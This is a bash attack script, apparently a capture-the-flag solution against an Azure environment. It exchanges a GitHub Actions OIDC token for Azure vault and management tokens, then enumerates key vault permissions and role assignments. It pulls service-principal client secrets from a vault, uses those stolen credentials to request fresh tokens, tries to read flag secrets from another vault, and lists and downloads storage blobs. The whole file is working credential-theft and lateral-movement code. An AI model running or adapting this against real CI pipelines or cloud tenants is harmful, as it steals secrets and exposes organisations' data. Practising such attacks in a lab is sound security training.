#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e; SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
exch(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=$1" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
sptok(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d grant_type=client_credentials --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
VT=$(exch "https://vault.azure.net/.default"); MT=$(exch "https://management.azure.com/.default")
# kv-tbl-sec resource id + props
RID=$(curl -sS -H "Authorization: Bearer $MT" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | python3 -c 'import sys,json
for r in json.load(sys.stdin).get("value",[]):
 if r.get("name")=="kv-tbl-sec-x3euoz": print(r["id"])')
echo "kv-sec id=$RID"
echo "=== kv-sec properties (accessPolicies/rbac) ==="
curl -sS -H "Authorization: Bearer $MT" "https://management.azure.com$RID?api-version=2022-07-01" | python3 -c 'import sys,json
d=json.load(sys.stdin);p=d.get("properties",{})
print("enableRbac=",p.get("enableRbacAuthorization"))
for ap in p.get("accessPolicies",[]): print("AP objectId=",ap.get("objectId"),"secrets=",ap.get("permissions",{}).get("secrets"))' 2>/dev/null
echo "=== role assignments at kv-sec ==="
curl -sS -H "Authorization: Bearer $MT" "https://management.azure.com$RID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | python3 -c 'import sys,json
d=json.load(sys.stdin)
for r in d.get("value",[]): pr=r.get("properties",{});print("RA principalId=",pr.get("principalId"),"roleDefId=",pr.get("roleDefinitionId","").split("/")[-1])' 2>/dev/null
# storage blobs via each SP
names="cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal"
for n in $names; do
  js=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$n?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
  cid=$(printf '%s' "$js" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("appId",""))')
  sec=$(printf '%s' "$js" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("clientSecret",""))')
  st=$(sptok "$cid" "$sec" "https://storage.azure.com/.default")
  svt=$(sptok "$cid" "$sec" "https://vault.azure.net/.default")
  echo "## $n st=${#st} svt=${#svt}"
  # try kv-sec GET flag with this SP
  for fn in flag FLAG; do
    r=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$fn?api-version=7.4" -H "Authorization: Bearer $svt" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("value") or d.get("error",{}).get("code"))')
    [ "$r" != "Forbidden" ] && [ "$r" != "SecretNotFound" ] && echo "   kv-sec/$fn[$n] = $r"
  done
  # storage blobs
  for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
    for c in config exports logs; do
      bl=$(curl -sS "https://$SA.blob.core.windows.net/$c?restype=container&comp=list" -H "Authorization: Bearer $st" -H "x-ms-version: 2021-08-06" | grep -oE "<Name>[^<]+</Name>" | sed -E 's/<\/?Name>//g')
      for b in $bl; do
        echo "   BLOB[$n] $SA/$c/$b"
        curl -sS "https://$SA.blob.core.windows.net/$c/$b" -H "Authorization: Bearer $st" -H "x-ms-version: 2021-08-06" | grep -aoiE "DFCD\{[^}]*\}" | sed 's/^/      HIT /'
      done
    done
  done
done
echo END
